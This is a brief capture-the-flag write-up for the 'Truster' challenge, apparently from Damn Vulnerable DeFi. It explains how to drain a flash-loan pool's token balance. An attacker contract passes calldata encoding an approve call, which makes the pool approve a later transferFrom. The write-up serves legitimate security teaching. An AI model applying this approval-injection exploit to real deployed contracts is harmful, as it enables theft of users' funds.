# Challenge #3 - Truster

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.

# Solution

Create an attacker contract that will call the `target.functionCall(data);` with data as follow:

```
bytes memory data = abi.encodeWithSignature(
    "approve(address,uint256)",
    // _contract,
    address(this),
    contractBalance
);
```

so that the pool contract approve a future `transferFrom` call from the attacker contract.
